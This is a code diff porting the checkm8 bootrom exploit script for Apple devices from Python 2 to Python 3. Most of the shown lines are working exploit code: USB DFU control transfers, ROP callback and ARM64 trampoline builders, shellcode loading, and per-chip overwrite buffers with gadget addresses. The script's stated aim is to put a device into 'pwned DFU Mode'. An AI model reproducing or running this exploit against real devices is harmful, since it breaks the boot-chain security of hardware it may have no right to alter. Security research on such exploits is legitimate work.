@@ -1,6 +1,7 @@
 import array, ctypes, struct, sys, time
 import usb
 import dfu
+import codecs
 
 # Must be global so garbage collector never frees it
 request = None
@@ -26,14 +27,14 @@ def libusb1_create_ctrl_transfer(device, request, timeout):
 
 def libusb1_async_ctrl_transfer(device, bmRequestType, bRequest, wValue, wIndex, data, timeout):
   if usb.backend.libusb1._lib is not device._ctx.backend.lib:
-    print 'USB Error: This exploit requires libusb1 backend, but another backend is being used. Exiting.'
+    print('USB Error: This exploit requires libusb1 backend, but another backend is being used. Exiting.')
     sys.exit(1)
 
   global request, transfer_ptr, never_free_device
   request_timeout = int(timeout) if timeout >= 1 else 0
   start = time.time()
   never_free_device = device
-  request = array.array('B', struct.pack('<BBHHH', bmRequestType, bRequest, wValue, wIndex, len(data)) + data)
+  request = array.array('B', struct.pack('<BBHHH', bmRequestType, bRequest, wValue, wIndex, len(data)) + codecs.decode(data, 'hex'))
   transfer_ptr = libusb1_create_ctrl_transfer(device, request, request_timeout)
   assert usb.backend.libusb1._lib.libusb_submit_transfer(transfer_ptr) == 0
 
@@ -48,7 +49,7 @@ def libusb1_no_error_ctrl_transfer(device, bmRequestType, bRequest, wValue, wInd
   try:
     device.ctrl_transfer(bmRequestType, bRequest, wValue, wIndex, data_or_wLength, timeout)
   except usb.core.USBError:
-    print("USB Error: libusb1_no_error_ctrl_transfer")
+    print('USB Error: libusb1_no_error_ctrl_transfer')
     pass
 
 def usb_rop_callbacks(address, func_gadget, callbacks):
@@ -77,12 +78,13 @@ def asm_arm64_branch(src, dest):
     value = 0x18000000 - (src - dest) / 4
   else:
     value = 0x14000000 + (dest - src) / 4
+  value = int(value)
   return struct.pack('<I', value)
 
 # TODO: check if start offset % 4 would break it
 # LDR X7, [PC, #OFFSET]; BR X7
 def asm_arm64_x7_trampoline(dest):
-  return '47000058E0001FD6'.decode('hex') + struct.pack('<Q', dest)
+  return codecs.decode('47000058E0001FD6', 'hex') + struct.pack('<Q', dest)
 
 # THUMB +0 [0xF000F8DF, ADDR]  LDR.W   PC, [PC]
 # THUMB +2 [0xF002F8DF, ADDR]  LDR.W   PC, [PC, #2]
@@ -101,7 +103,7 @@ def prepare_shellcode(name, constants=[]):
     fmt = '<%sQ'
     size = 8
   else:
-    print 'ERROR: Shellcode name "%s" does not end with known architecture. Exiting.' % name
+    print('ERROR: Shellcode name "%s" does not end with known architecture. Exiting.' % name)
     sys.exit(1)
 
   with open('bin/%s.bin' % name, 'rb') as f:
@@ -259,7 +261,7 @@ def payload(cpid):
     T7000_shellcode = prepare_shellcode('checkm8_arm64', constants_checkm8_T7000)
     assert len(T7000_shellcode) <= PAYLOAD_OFFSET_ARM64
     assert len(T7000_handler) <= PAYLOAD_SIZE_ARM64
-    return T7000_shellcode + '\0' * (PAYLOAD_OFFSET_ARM64 - len(T7000_shellcode)) + T7000_handler 
+    return T7000_shellcode + b'\0' * (PAYLOAD_OFFSET_ARM64 - len(T7000_shellcode)) + T7000_handler 
 
   if cpid == 0x8002:
     constants_usb_t8002 = [
@@ -454,14 +456,14 @@ def all_exploit_configs():
   t8011_nop_gadget = 0x10000CD0C
   t8015_nop_gadget = 0x10000A9C4
 
-  s5l8947x_overwrite = '\0' * 0x660 + struct.pack('<20xI4x', 0x34000000)
-  s5l895xx_overwrite = '\0' * 0x640 + struct.pack('<20xI4x', 0x10000000)
-  t800x_overwrite    = '\0' * 0x5C0 + struct.pack('<20xI4x', 0x48818000)
-  s5l8960x_overwrite = '\0' * 0x580 + struct.pack('<32xQ8x', 0x180380000)
-  t7000_overwrite    = '\0' * 0x580 + struct.pack('<32xQ8x', 0x180380000) # ???
-  t8010_overwrite    = '\0' * 0x580 + struct.pack('<32x2Q16x32x2QI',    t8010_nop_gadget, 0x1800B0800, t8010_nop_gadget, 0x1800B0800, 0xbeefbeef)
-  t8011_overwrite    = '\0' * 0x500 + struct.pack('<32x2Q16x32x2QI',    t8011_nop_gadget, 0x1800B0800, t8011_nop_gadget, 0x1800B0800, 0xbeefbeef)
-  t8015_overwrite    = '\0' * 0x500 + struct.pack('<32x2Q16x32x2Q12xI', t8015_nop_gadget, 0x18001C020, t8015_nop_gadget, 0x18001C020, 0xbeefbeef)
+  s5l8947x_overwrite = b'\0' * 0x660 + struct.pack('<20xI4x', 0x34000000)
+  s5l895xx_overwrite = b'\0' * 0x640 + struct.pack('<20xI4x', 0x10000000)
+  t800x_overwrite    = b'\0' * 0x5C0 + struct.pack('<20xI4x', 0x48818000)
+  s5l8960x_overwrite = b'\0' * 0x580 + struct.pack('<32xQ8x', 0x180380000)
+  t7000_overwrite    = b'\0' * 0x580 + struct.pack('<32xQ8x', 0x180380000) # ???
+  t8010_overwrite    = b'\0' * 0x580 + struct.pack('<32x2Q16x32x2QI',    t8010_nop_gadget, 0x1800B0800, t8010_nop_gadget, 0x1800B0800, 0xbeefbeef)
+  t8011_overwrite    = b'\0' * 0x500 + struct.pack('<32x2Q16x32x2QI',    t8011_nop_gadget, 0x1800B0800, t8011_nop_gadget, 0x1800B0800, 0xbeefbeef)
+  t8015_overwrite    = b'\0' * 0x500 + struct.pack('<32x2Q16x32x2Q12xI', t8015_nop_gadget, 0x18001C020, t8015_nop_gadget, 0x18001C020, 0xbeefbeef)
 
   return [
     DeviceConfig('iBoot-1458.2',          0x8947,  626, s5l8947x_overwrite, None, None), # S5L8947 (DFU loop)     1.97 seconds
@@ -494,21 +496,21 @@ def exploit_config(serial_number):
       return payload(config.cpid), config
   for config in all_exploit_configs():
     if 'CPID:%s' % config.cpid in serial_number:
-      print 'ERROR: CPID Compatible but iBoot version is not'
-      print 'Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.'
+      print('ERROR: CPID Compatible but iBoot version is not')
+      print('Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.')
       sys.exit(1)
-  print 'ERROR: This is not a compatible device. Exiting.'
+  print('ERROR: This is not a compatible device. Exiting.')
   sys.exit(1)
 
 def exploit():
-  print '*** checkm8 exploit by axi0mX ***'
+  print('*** checkm8 exploit by axi0mX ***')
 
   print('**** STAGE 1 ****')
   print('Checking for device in DFU mode')
 
   device = dfu.acquire_device()
   start = time.time()
-  print 'Found:', device.serial_number
+  print('Found:', device.serial_number)
   if 'PWND:[' in device.serial_number:
     print("Device already PWNed. Exiting.")
     return
@@ -570,8 +572,8 @@ def exploit():
   # check if device pwned
   device = dfu.acquire_device()
   if 'PWND:[checkm8]' not in device.serial_number:
-    print 'ERROR: Exploit failed. Device did not enter pwned DFU Mode.'
+    print('ERROR: Exploit failed. Device did not enter pwned DFU Mode.')
     sys.exit(1)
-  print 'Device is now in pwned DFU Mode.'
-  print '(%0.2f seconds)' % (time.time() - start)
+  print('Device is now in pwned DFU Mode.')
+  print('(%0.2f seconds)' % (time.time() - start))
   dfu.release_device(device)
